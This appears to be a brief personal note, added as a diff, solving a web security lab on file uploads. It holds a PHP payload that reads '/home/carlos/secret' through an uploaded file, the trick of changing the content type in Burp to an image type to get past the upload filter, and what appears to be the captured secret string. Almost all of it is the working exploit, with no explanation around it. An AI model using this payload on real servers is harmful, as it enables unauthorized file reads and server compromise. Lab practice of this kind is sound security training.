@@ -1,0 +1,4 @@
+via upload file : <?php echo file_get_contents('/home/carlos/secret'); ?>
+and change app type via burp to accepted file types (jepg , png )
+
+4ahJskwSgF69wJLBaWfVvucmjVu8o1ts
